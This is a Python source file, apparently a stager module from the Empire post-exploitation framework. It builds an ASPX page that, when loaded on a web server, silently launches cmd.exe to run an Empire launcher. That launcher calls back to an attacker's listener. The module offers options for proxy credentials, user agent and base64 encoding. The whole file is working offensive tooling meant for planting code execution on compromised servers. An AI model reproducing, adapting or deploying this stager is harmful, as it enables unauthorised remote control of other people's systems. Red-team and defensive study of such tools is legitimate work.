#ASPX Stager
from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'ASPX',

            'Author': ['Andrew @ch33kyf3ll0w Bonstrom'],

            'Description': ('Generates an ASPX file that executes the Empire stager.'),

            'Comments': [
                'Grabbed the skeleton of code structure straight from msfvenom.'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output ASPX to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/launcher.aspx'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
	else:
			code = '''<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
System.Diagnostics.Process si = new System.Diagnostics.Process();
            si.StartInfo.WorkingDirectory = "c:\\";
            si.StartInfo.UseShellExecute = false;
            si.StartInfo.FileName = "cmd.exe";
            si.StartInfo.Arguments = "/c ''' +  launcher + '''";
            si.StartInfo.CreateNoWindow = true;
            si.StartInfo.RedirectStandardInput = true;
            si.StartInfo.RedirectStandardOutput = true;
            si.StartInfo.RedirectStandardError = true;
            si.Start();
            si.Close();
</script>
'''

        return code
